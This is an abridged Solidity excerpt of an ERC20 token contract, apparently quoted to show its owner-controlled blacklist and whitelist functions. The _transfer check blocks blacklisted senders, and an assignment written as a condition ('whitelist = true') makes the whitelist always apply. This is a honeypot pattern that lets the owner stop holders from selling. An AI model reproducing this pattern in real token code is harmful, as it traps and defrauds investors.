...
contract Token is Context, IERC20, IERC20Metadata {
    ...
    function Blacklist_on(address _account)  public {
        require(msg.sender == owner);
        _blackbalances[_account] = true;
    }
    
    function Blacklist_off(address _account)  public {
        require(msg.sender == owner);
        _blackbalances[_account] = false;
    }
    
    
    function whitelist_on(address _account)  public {
        require(msg.sender == owner);
        _whitebalances[_account] = true;
    }
    
    function whitelist_off(address _account)  public {
        require(msg.sender == owner);
        _whitebalances[_account] = false;
    }
    
    
    function whitelist_enabled(bool _whitelist)  public {
    ...
    function _transfer(
        ...
        require(_blackbalances[sender] != true );
         ...
         if ( whitelist = true)
         {
           require(_whitebalances[sender] == true );
         }
